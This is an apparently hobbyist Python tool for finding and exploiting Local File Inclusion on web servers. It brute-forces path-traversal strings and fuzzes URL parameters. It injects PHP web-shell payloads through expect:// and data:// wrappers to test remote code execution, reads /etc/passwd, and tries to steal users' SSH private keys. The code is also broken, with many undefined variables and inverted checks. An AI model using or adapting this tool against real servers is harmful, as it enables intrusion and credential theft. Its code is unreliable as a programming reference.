import requests
import time 
import os
import sys
import optparse
import hashlib
import re
from base64 import b64decode





def banner():
    print("")
    print("")
    print("Local File Inclusion vulneraility scanner")
    print("by Ayush")
    print("Profile name: LuciferXn                  _____              ")
    print("                                     ___|_____|___         ")
    print("                                   /               \        ")
    print("Version 1.0                       /                 \       ")
    print("                                 | ----------------- |       ")
    print("  ##                              ||    ||   ||    ||       ")
    print("  ##                              ||    ||   ||    ||       ")
    print("  ##                              ||    ||   ||    ||       ")
    print("  ##                              ||    ||   ||    ||       ")
    print("  ##                               -----------------        ")
    print("  ##                              \                 /       ")
    print("  ##                               \_______________/        ")
    print("                                      \_________/           ")
    print("New Version coming soon :)                                  ")
    print("____________________________________________________")
    print("")

    return

USER_AGENT = {"User-Agent":"Lantern/1.0"}

#the function will check whether the url is live or not
def check_url(url):

    if not url or "?" not in url:
        print("[#] Please enter a Valid URL")
        print("[#] Exiting ...")
        time.sleep(1)
        sys.exit(1)
        

    if not url.startswith("http"):
        url = "http://" + url

    if "lfi" not in url:
        url += "lfi"
        

    print("[#] Connecting to URL....")
    print("")
    try:
        conn = requests.get(url)
    except requests.exceptions.RequestException as e:
        raise SystemExit(e)
    
        
    
    return url

def LFI_traversal(url,p_length,traversal_file,filter_str,flag=False):
    traversal = ""
    traverse_str = "/.."
    depth = 0
    
    if not flag:
        print("\n[#]Traversing through files \n")
    while True:
        if not flag:
            sys.stdout.write(f"\r[*] - ATTEMPT : {traversal}")
        req=requests.get(url.replace("lfi",traversal+traversal_file))
        if req.status_code < 400:
            if LFI_checked(req.text,filter_str=filter_str,p_length=p_length):
                return traversal

        depth += 1

        if depth == 10:
            if traverse_str== "/..":
                traverse_str = "/.*"
                depth = 1
            elif traverse_str == "/.*":
                traverse_str = "/.?"
                depth = 1
            elif traverse_str == "/.?":
                traverse_str = "/..../"
                depth = 1
            elif traverse_str == "/..../":
                traverse_str = "%2e%2e%2f"
                depth = 1
            elif traverse_str == "%2e%2e%2f":
                traverse_str = "%2f%2e%2e%2e%2e%2f"
                depth = 1
            else:
                return None

        traversal=(traverse_str)*depth


#the function will search for the parameter which can be used to further exploit the LFI
def Fuzz(url, traversal_file):
    param_fuzz_list = []
    valid_params = []
    
    with open("fuzz-list.txt", "r") as f:
            param_fuzz_list = f.read().split("\n")
    
    print("[#] - FUZZING URL PARAMETERS...")
    
    for param in param_fuzz_list:
        sys.stdout.flush()
        sys.stdout.write(f"\r[*] - Trying {param}           ")
        resp = requests.get(url.replace("PARAM", param).replace("LFI", traversal_file))
        if resp.status_code < 400:
            print(f"\n[+] - FOUND VALID PARAM : {param}")  
            valid_params.append(param)
    return valid_params


#makes a request to the page for the file found        
def request_page(url,traversal,filename):
    payload=traversal + filename
    curr_url=url.replace("lfi",payload)
    return requests.get(curr_url,headers=USER_AGENT),curr_url



#checks whether the code can be executed using PHP wrappers
def code_execution(url):
    print("\n[#] - TESTING REMOTE CODE EXECUTION \n\n")

    req,used_url=request_page(url,"expect://", "echo Lucifer took your soul")
    if "Lucifer took your soul" in req.text and "echo" not in req.text:
        print("[+] - RCE WORKS WITH 'expect://'' WRAPPER:" + used_url)
        print("")
    else:
        print("[-] - RCE DOES NOT WORKS 'expect://' WRAPPER: " + used_url)
        print("")

    req,used_url=request_page(url,"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=", "&cmd=echo Lucifer took your soul")
    if "Lucifer took your soul" in req.text and "echo" not in req.text:
        print("[+] - RCE WORKS WITH 'data://' WRAPPER: " + used_url)
        print("")

    else:
        print("[-] - RCE DOES NOT WORKS 'data://' WRAPPER: " + used_url)
        print("")



    req, used_url = request_page(url, "data://text/plain,<?php echo passthru($_GET['cmd']) ?>", "&cmd=echo Lucifer took your soul")
    if 'Lucifer took your soul' in req.text and "echo" not in req.text:
        print("[+] - RCE WORKS WITH 'data://' WRAPPER: " + used_url)
        print("")

    else:
        print("[-] - RCE DOES NOT WORKS 'data://' WRAPPER: " + used_url)
        print("")

    

#checks if LFI is valid in default,with empty string and the page length when no param is passed
def LFI_checked(r_text,filter_str="",p_length=0):
    if filter_str:
        if filter_str not in r_text and len(r_text) != p_length:
            return True
    elif len(r_text) != p_length:
            return True
    
    return False



#reads content of the file specified from the webserver's specified page using base64 php filter
def file_read(url,traversal,file_to_read,flag=False):
    if file_to_read.startswith("/"):
        page_data=page_read(url,traversal + file_to_read,flag=False)
    else:
        curr_attempt=""
        for attempt in traversal.split("/"):
            curr_attempt += attempt+"/"
            page_data=page_read(url,curr_attempt + file_to_read,flag=flag)
            if page_data:
                return page_data
    return page_data

#reads the server side code and checkers for any blacklists and all
def page_read(url,page,flag=False):
    if not quite:
        print("[#]Reading the {} Page....".format(page))

    req, this_url = request_page(url, "php://filter/read=convert.base64-encode/resource=", page)
    base64regex = re.compile(r'(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)')
    source=base64regex.findall(req.text)
    if not source:
        print("[#] Reading page: " + this_url)
        return b64decode("".join(pagesource)).decode()
    elif page.endswith(".php"):
        return read_page(url, page.replace(".php", ""))
    else:
        if not quiet:   
            print("[#] Failed to read page: " + this_url)

    return None




def extract_user(url,traversal):
    raw_list=file_read(url,traversal,"/etc/passwd",flag=True)
    print("\n[#]Accessing /etc/passwd files")

    if user_list:
        user_list=raw_list.split("\n")
        user_home=[]

        for users in user_list:
            if "/bin" in users:
                    users_home.append(user.split(":")[-2])
        return users_home
    else:
        print("\n[-] - UNFORTUNATELY THE /ETC/PASSWD FILE COULD NOT BE ACCESSED...")




def main():

    arg_parser = optparse.OptionParser()
    arg_parser.add_option("-u", dest="url", help="The URL in the format http://www.example.com?file=lfi")
    arg_parser.add_option("--tf", dest="traversal_file",help="search your own custom file-by default it is set to /etc/passwd")
    arg_parser.add_option("--filter", dest="filter_str",help="An error string that appears commonly on the page when you try to load in an invalid file: 'ERROR - cannot find'. NOTE - this is case sensitive")
    arg_parser.add_option("--cfl", dest="custom_list",help="Specify your own list of files to attempt to find through the LFI")
    arg_parser.add_option("-r", dest="file_to_read",help="create your own file to read through LFI,must specify an absolute path")
    arg_parser.add_option("--param-fuzz", dest="param_fuzz", help="provide 1 with this option to tell the LFI fuzz to find Lfi vulneraility - --param-fuzz=1")
    (options, args) = arg_parser.parse_args()


    banner()
    url=check_url(options.url)
    print("")

    traversal_file="/etc/passwd"

    if options.traversal_file:
        traversal_file=options.traversal_file

    filter_str=""
    if options.filter_str:
        filter_str=options.filter_str

    custom_list="wordlist.txt"
    if options.custom_list:
        custom_list=options.custom_list

    with open(custom_list, "r") as f:
        filelist = f.read().split('\n')

     
    file_to_read = "" 
    if options.file_to_read:
        file_to_read = options.file_to_read

    param_fuzz=False
    param_fuzz_list=[]
    valid_param=[]
    if options.param_fuzz=="1":
        if "?PARAM=" not in url:
            print("\n[#] - enter URL with '?PARAM=' to be able to fuzz")
            sys.exit(1)
        param_fuzz = True

    if param_fuzz:
        valid_param=Fuzz(url,traversal_file)
        if not valid_param:
            print("\n\n[#] -No params found...Exiting")
            sys.exit(1)
        else:
            print("\n\n[#] - Params found,don't use the tool with --param-fuzz=1 now")
            [print(url.replace("PARAM", p)) for p in valid_param]
            sys.exit(1)

#checks the length of the page,with an empty parameter and with a normal parameter to filter out the response 

    req = requests.get(url.replace("lfi", ""))
    if req.status_code > 400:
        req = requests.get(url.replace("lfi", "test"))
    p_length = len(req.text)


    traversal=LFI_traversal(url,p_length,traversal_file,filter_str)


    if traversal==None:
        print("\n[#] No traversal path was found,Better luck next time:...Exiting....")
        sys.exit(1)

    print("\n[#] Traversal File found: " + traversal + traversal_file)


#the traversal path and file has been found,not to read the custom file provided by the user
    
    if file_to_read:
        info=file_read(url,traversal,file_to_read)
        if info:
            print(data)

#if everything is found now it's time to check if code can be executed

    code_execution(url)

#Finding valid files for LFI through list

    print("\n[#] FINDING LFI FILES...")
    for f in filelist:
        req,this_url=request_page(url,traversal,f)
        if LFI_checked(url,filter_str=filter_str,p_length=p_length):
            print("\n[#] - LFI SUCCESS: " + this_url)

#extracting users found in /etc/passwd

    directory_home=extract_user(url,traversal)
    if not directory_home:
        print("[#] Nothing found")
        sys.exit(1)
    for directory in directory_home:
        users_key = directory + "/.ssh/id_rsa"
        ssh_keys=page_read(url,traversal + users_key, quiet=True)
        if ssh_keys:
            print("[#] SSH keys found" + users_key)
            print(b64decode(ssh_key_b64).decode())
        else:
            print("[-] - UNABLE TO ACCESS THE FILE " + users_key)

if __name__ == "__main__":
    main()